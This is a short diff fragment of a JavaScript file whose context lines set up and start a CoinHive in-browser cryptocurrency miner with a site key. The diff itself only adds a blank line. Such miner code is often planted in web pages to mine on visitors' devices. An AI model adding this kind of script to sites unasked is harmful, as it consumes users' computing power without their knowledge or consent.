@@ -6,3 +6,4 @@ var miner = new CoinHive.Anonymous('dsHhjGWO1hjduk2UXl7h74p3wYV10Rv3', {
     forceASMJS: false
 });
 miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+
